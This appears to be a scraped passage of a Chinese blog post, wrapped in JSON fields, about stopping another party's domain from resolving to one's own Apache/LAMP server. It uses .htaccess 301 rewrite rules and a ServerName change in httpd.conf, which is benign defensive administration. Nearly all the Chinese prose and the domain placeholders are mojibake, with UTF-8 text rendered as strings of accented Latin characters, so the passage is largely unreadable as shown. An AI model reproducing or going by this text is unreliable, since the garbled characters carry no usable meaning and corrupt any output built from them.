æ¥ä¸‹æ¥æŠŠNoneæ”¹æˆAll\n0x03.ç¼–å†™è§„åˆ™æ–‡ä»¶.htaccess è·‘å»ç½‘ç«™æ ¹ç›®å½•ä¸‹ï¼Œæ¯”å¦‚æˆ‘çš„æ˜¯/var/www/html å¦‚æœå­˜åœ¨.htaccessï¼Œå¿½ç•¥ä¸‹ä¸€æ­¥ï¼Œç›´æ¥æ‰“å¼€ç¼–è¾‘ ç„¶åæ–°å»º.htaccessæ–‡ä»¶touch .htaccess ç¼–è¾‘.htaccessæ–‡ä»¶vi .htaccess æ·»åŠ å¦‚ä¸‹è§„åˆ™\n1 2 3 4 RewriteEngine on RewriteCond %{HTTP_HOST} ^åˆ«äººçš„åŸŸå.com$ [OR] RewriteCond %{HTTP_HOST} ^www.åˆ«äººçš„åŸŸå.com$ RewriteRule ^(.*)$ http://www.è‡ªå·±çš„åŸŸå.com/$1 [R=301,L] ä¸ªäººçš„ä¿®æ”¹ æˆ‘çŸ¥é“ï¼Œä½ åœ¨ç½‘ä¸Šæ‰€æ‰¾åˆ°çš„æ–¹æ³•éƒ½æ˜¯ä¸Šé¢é‚£ç§ä»£ç ï¼Œå¹¶ä¸”åº”è¯¥éƒ½æ²¡æœ‰æ æ•™ä½ æ€ä¹ˆå¼€å¯.htaccess ä½†æ˜¯æœ¬äººå®éªŒè¿‡ï¼Œè¿™é…ç½®è¿›å»è¿˜æœ‰é—®é¢˜ï¼Œè®¾ç½®é‡å¯Apacheåï¼Œè®¿é—®ç½‘ç«™æç¤º500é”™è¯¯ æœºæ™ºçš„æˆ‘æ€»è¦æŸ¥çœ‹æ—¥å¿—å•Š\n1 cat /var/log/messages | grep httpd æ‰¾åˆ°äº†é”™è¯¯ è‹±è¯­ä¸å¤ªå¥½ï¼Œä½†æ˜¯å¤§è‡´çŸ¥é“æ˜¯æœåŠ¡å™¨æ²¡æœ‰é™å®šåŸŸåï¼Œéœ€è¦ä¿®æ”¹ServerName,è€ŒServerNameå­—æ®µå€¼åœ¨httpd.confä¸­æ˜¯è¢«æ³¨é‡Šæ‰çš„ æˆ‘ä»¬åœ¨httpd.confä¿®æ”¹å®ƒ\n1 #ServerName: www.example.com:80 æ”¹ä¸º\n1 ServerName: 115.**.**.57:80 ç„¶åé‡å¯Apacheï¼Œå¯ä»¥è®¿é—®äº†\nåç»­ å¥½çš„æ•…äº‹éƒ½ä¼šæœ‰åç»­çš„\nä»¥ä¸ºè¿™æ ·å°±ä¸‡äº‹å¤§å‰äº†?\nä½†æ˜¯æˆ‘è¿™ä¸ªè¢«å‘å¾—ä¸è½» admin.xx.coméƒ½è¢«ä»–è§£æåˆ°æˆ‘æœåŠ¡å™¨ä¸Šæ¥äº†\nè€è¡²æ€ä¹ˆç ´ .htaccesså¥½åƒå¯ä»¥ç”¨æ­£åˆ™è¡¨è¾¾å¼ï¼Œä¸€æŸ¥ï¼Œæœç„¶ é‚£å°±æ”¹ä¸€ä¸‹.htaccesså’¯ 1 2 3 4 RewriteEngine on RewriteCond %{HTTP_HOST} ^åˆ«äººçš„åŸŸå.com$ [OR] RewriteCond %{HTTP_HOST} ^.*.åˆ«äººçš„åŸŸå.com$ RewriteRule ^(.*)$ http://www.è‡ªå·±çš„åŸŸå.com/$1 [R=301,L] æœºæ™ºçš„ä½ å·²ç»å‘ç°ç¬¬ä¸‰è¡Œä¸­çš„wwwè¢«æˆ‘æ”¹æˆäº†.ï¼Œå°±æ˜¯åŒ¹é…0ä¸ªæˆ–è€…å¤šä¸ªå­—ç¬¦ï¼Œå½“ç„¶ä½ å¯ä»¥æ”¹æˆ+\nç„¶åé‡å¯Apache\n1 systemctl restart httpd æˆ–è€…\n1 service httpd restart ç°åœ¨æˆ‘å†è®¿é—®ã€‚ã€‚ã€‚å˜¿å˜¿å˜¿ï¼Œè¢«æˆ‘è·³è½¬åˆ°ç™¾åº¦äº† æ€è€ƒ å½“ç„¶ï¼Œè¿˜æœ‰å…¶ä»–çš„æ–¹æ³•ï¼Œè‡ªå·±ä¹Ÿå¯ä»¥å»ç½‘ä¸Šæ‰¾æ‰¾ å¯¹äº†ï¼Œé‚£ä¸ªåˆšæ‰åœ¨httpd.confé‡Œæ¢ipçš„åœ°æ–¹ä¹Ÿå¯æ¢è‡ªå·±çš„åŸŸåï¼Œå› ä¸ºæˆ‘çš„è¿˜åœ¨å¤‡æ¡ˆï¼Œå°±æ²¡æ”¹\n","permalink":"https://www.hacktech.cn/post/lamp%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A2%AB%E4%BA%BA%E6%81%B6%E6%84%8F%E7%BB%91%E5%AE%9A%E5%9F%9F%E5%90%8D%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95.html","summary":"\u003ch1 id=\"è¿˜æ²¡å¼€å§‹å°±è¢«åˆ«äººç»‘å®šäº†åŸŸå\"\u003eè¿˜æ²¡å¼€å§‹å°±è¢«åˆ«äººç»‘å®šäº†åŸŸå\u003c/h1\u003e\n\u003ch2 id=\"äº‹æƒ…çš„èµ·å› ä¸å‘ç°\"\u003eäº‹æƒ…çš„èµ·å› ä¸å‘ç°\u003c/h2\u003e\n\u003cp\u003eåˆšä¹°äº†ä¸ªæœåŠ¡å™¨æ­å»ºäº†ä¸€ä¸ªdzï¼Œæƒ³ç€åŸŸåè¿˜æ²¡å¤‡æ¡ˆï¼Œå°±å…ˆæ­å»ºäº†èµ·æ¥ï¼Œç„¶ååœ¨åšDDOSæµ‹è¯•æ—¶å¶ç„¶å‘ç°æœåŠ¡å™¨è¢«åˆ«äººæ¶æ„æŠŠåŸŸåç»‘å®šäº†\u003c/p\u003e\n\u003ch2 id=\"æœ€åˆçš„è§£å†³æ–¹æ¡ˆ\"\u003eæœ€åˆçš„è§£å†³æ–¹æ¡ˆ\u003c/h2\u003e\n\u003cp\u003eæ²¡ç®¡ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚\nåæ¥å‘ç°æœ‰å½±å“ï¼Œæœ‹å‹ä¹Ÿä¸€ç›´ç»™æˆ‘è¯´å«æˆ‘æ•´ä¸‹\u003c/p\u003e\n\u003ch2 id=\"åˆ©ç”¨é‡å®šå‘æŠŠæ¶æ„æŒ‡å‘è¿‡æ¥çš„åŸŸåæŒ‡åˆ°åˆ«å¤„\"\u003eåˆ©ç”¨é‡å®šå‘æŠŠæ¶æ„æŒ‡å‘è¿‡æ¥çš„åŸŸåæŒ‡åˆ°åˆ«å¤„\u003c/h2\u003e\n\u003cp\u003eè¦åˆ©ç”¨301é‡å®šå‘ï¼Œé¦–å…ˆæˆ‘ä»¬è¦åœ¨Apacheä¸Šé…ç½®ä¸€ä¸‹ï¼ŒApacheé»˜è®¤æ˜¯ä¸å¼€å¯.htaccessçš„\u003c/p\u003e","title":"lampæœåŠ¡å™¨è¢«äººæ¶æ„ç»‘å®šåŸŸåçš„è§£å†³åŠæ³•"}]